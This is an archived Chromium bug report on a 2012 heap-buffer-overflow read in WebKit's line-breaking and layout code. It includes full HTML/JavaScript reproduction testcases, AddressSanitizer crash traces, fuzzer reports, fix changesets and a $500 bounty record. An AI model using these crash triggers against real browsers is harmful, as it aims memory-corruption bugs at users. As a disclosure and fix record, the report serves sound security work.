# Heap-buffer-overflow in WebCore::RenderBlock::LineBreaker::nextLineBreak

| Field | Value |
|-------|-------|
| **Issue ID** | [40056011](https://issues.chromium.org/issues/40056011) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ds...@chromium.org |
| **Created** | 2012-04-01 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**

heap buffer overflow in WebCore::RenderBlock::computeInlineDirectionPositionsForLine

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 20.0.1089.0 (Developer Build 130071)  

OS Linux  

WebKit 536.6 (@112724)

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-writing-mode: vertical-lr;
}
#el0:first-line {
-webkit-text-stroke: 1px;
}
#el1 {
display: table-footer-group;
}
.c1 {
-webkit-appearance: -webkit-input-speech-button;
-webkit-text-combine: horizontal;
display: table;
}
</style>
<script>
onload = function() {
el0=document.createElement('rt')
el0.setAttribute('id','el0')
el0.setAttribute('class', 'c1')
document.body.appendChild(el0)
el0.appendChild(document.createTextNode(unescape('%ud800'+Array(1024).join('A')+'%u3000A')))
el1=document.createElement('div')
el1.setAttribute('id','el1')
el1.setAttribute('class', 'c1')
el0.appendChild(el1)
}
</script>
</head>
<body>
</body>
</html>

alternatively remove line display: table; for a crash one stack frame higher up.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==14411== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffdc8c2822 at pc 0x555559b128e9 bp 0x7fffffff5850 sp 0x7fffffff5848  

READ of size 2 at 0x7fffdc8c2822 thread T0  

#0 0x555559b128e9 in WebCore::Font::expansionOpportunityCount(unsigned short const\*, unsigned long, WebCore::TextDirection, bool&) ???:0  

#1 0x55555aae33fe in WebCore::RenderBlock::computeInlineDirectionPositionsForLine(WebCore::RootInlineBox\*, WebCore::LineInfo const&, WebCore::BidiRun\*, WebCore::BidiRun\*, bool, WTF::HashMap<WebCore::InlineTextBox const\*, std::pair<WTF::Vector<WebCore::SimpleFontData

0x7fffdc8c2822 is located 2048 bytes to the right of 34-byte region [0x7fffdc8c2000,0x7fffdc8c2022)  

allocated by thread T0 here:  

#0 0x55555dee0552 in malloc ??:0  

#1 0x55555939e1cb in WTF::fastMalloc(unsigned long) ???:0  

#2 0x5555593bc2ff in WTF::StringImpl::create(unsigned short const\*, unsigned int) ???:0

## Attachments

- [buffar1.html](attachments/buffar1.html) (text/html; charset=us-ascii, 881 B)
- [buffar2.txt](attachments/buffar2.txt) (text/x-c; charset=us-ascii, 9.6 KB)
- [stable-buffar1.txt](attachments/stable-buffar1.txt) (text/x-c; charset=us-ascii, 9.8 KB)
- [buffar2.html](attachments/buffar2.html) (text/html; charset=us-ascii, 858 B)
- [buffar1.txt](attachments/buffar1.txt) (text/x-c; charset=us-ascii, 9.8 KB)
- [stable-buffar2.txt](attachments/stable-buffar2.txt) (text/x-c; charset=us-ascii, 9.7 KB)

## Timeline

### in...@chromium.org (2012-04-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-01)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=32651103

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x7f1ae2aaf6a2
Crash State:
  - crash stack -
  WebCore::Font::expansionOpportunityCount
  WebCore::RenderBlock::computeInlineDirectionPositionsForLine
  WebCore::RenderBlock::createLineBoxesFromBidiRuns
  

Minimized Testcase (0.79 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv974VjPQi65KUpMFarCO1gvR38GXpUeFXtM8QBSGSlTAipy1XnTRNyJGHE-dAwH4bs3rSEXT6DenibZtoIywTcIPH53aTzyJj5Z8Ggdnc9G4x9aT4TGHxbVb5wYbebI4zr6654KDTUbgzzW_mTAELaQs0TOaBg
<style>
      #el0 {
        -webkit-writing-mode: vertical-lr; 
      }
      #el0:first-line {
        -webkit-text-stroke: 1px;
      } 
      #el1 {
        display: table-footer-group;
      }
      .c1 {
        -webkit-appearance: -webkit-input-speech-button;
        -webkit-text-combine: horizontal;
        display: table;
</style>
    <script>
      onload = function() {
        el0=document.createElement('rt')
        el0.setAttribute('id','el0')
        el0.setAttribute('class', 'c1')
        document.body.appendChild(el0)
        el0.appendChild(document.createTextNode(unescape('%ud800'+Array(1024).join('A')+'%u3000A')))
        el1=document.createElement('div')
        el1.setAttribute('id','el1')
        el1.setAttribute('class', 'c1')
        el0.appendChild(el1)
      }
    </script>

### ts...@chromium.org (2012-04-02)

Upstreamed as: https://bugs.webkit.org/show_bug.cgi?id=82929

### in...@chromium.org (2012-05-09)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-10)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-16)

m19 is out, moving milestone m18 bugs to m19.

### in...@chromium.org (2012-06-10)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=58749477

Fuzzer: Inferno_twister

Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x7f11ac5318a4
Crash State:
  - crash stack -
  WebCore::RenderBlock::LineBreaker::nextLineBreak
  WebCore::RenderBlock::layoutRunsAndFloatsInRange
  WebCore::RenderBlock::layoutRunsAndFloats
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=116799:116819

Minimized Testcase (0.27 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97oUNlNE3lYuSgwXZjfqAtv9g5tyvd9FKsI5yKSswPzQNvW_dJ6s6Duir2uQiy8P7pIDbh47Wm6gS8V1s2PkM0ohoziu-yxs03r_KFWNsvhwV44tH6ARNDW9P7XKw2yE5bMlve4MEvgppAxkgFYWR-qnqO-UgyIz-iQPFQkF1B1WKjCS8Y
<style>.pass {
    -webkit-text-combine: horizontal;
    height: 1379857699px;
    }
.pass::first-line {
    -webkit-animation: anim1 238s linear -3370415977s 3771
    }
.pass:not([*|title*="on ch"]) {
    -webkit-writing-mode: vertical-rl;
</style>

>>>><span class="pass">');

### js...@chromium.org (2012-06-29)

Bulk Edit: m20 is shipped. Rolling open m19 bugs forward.

### ka...@google.com (2012-07-16)

looks like https://trac.webkit.org/changeset/104322/ ?


### in...@chromium.org (2012-08-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-08-02)

Please do read Mark's email titled "Code Yellow: Security Bug Backlog" on chrome-team mailing list.

### in...@chromium.org (2012-08-06)

[Empty comment from Monorail migration]

### mi...@chromium.org (2012-08-13)

[Empty comment from Monorail migration]

### ds...@chromium.org (2012-08-13)

[Empty comment from Monorail migration]

### ds...@chromium.org (2012-08-13)

Upstreamed: https://bugs.webkit.org/show_bug.cgi?id=93806

### in...@chromium.org (2012-08-14)

http://trac.webkit.org/changeset/125503

### cl...@chromium.org (2012-08-15)

ClusterFuzz has detected this issue as fixed in range 151459:151462.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=58749477

Fuzzer: Inferno_twister

Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x7f11ac5318a4
Crash State:
  - crash stack -
  WebCore::RenderBlock::LineBreaker::nextLineBreak
  WebCore::RenderBlock::layoutRunsAndFloatsInRange
  WebCore::RenderBlock::layoutRunsAndFloats
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=116799:116819
Fixed: https://cluster-fuzz.appspot.com/revisions?range=151459:151462

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97oUNlNE3lYuSgwXZjfqAtv9g5tyvd9FKsI5yKSswPzQNvW_dJ6s6Duir2uQiy8P7pIDbh47Wm6gS8V1s2PkM0ohoziu-yxs03r_KFWNsvhwV44tH6ARNDW9P7XKw2yE5bMlve4MEvgppAxkgFYWR-qnqO-UgyIz-iQPFQkF1B1WKjCS8Y

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-08-16)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-20)

Thanks miaubiz! OOB read => $500

### sc...@gmail.com (2012-08-24)

M21: http://trac.webkit.org/changeset/126633
M22: http://trac.webkit.org/changeset/126634

### sc...@gmail.com (2012-08-29)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-29)

Actually fixed in https://bugs.webkit.org/show_bug.cgi?id=93806 from what I can tell.

### sc...@gmail.com (2012-09-12)

Paid as part of $7133.70 batch.

### bu...@chromium.org (2012-10-14)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/121347?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/119344, crbug.com/chromium/124618]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056011)*
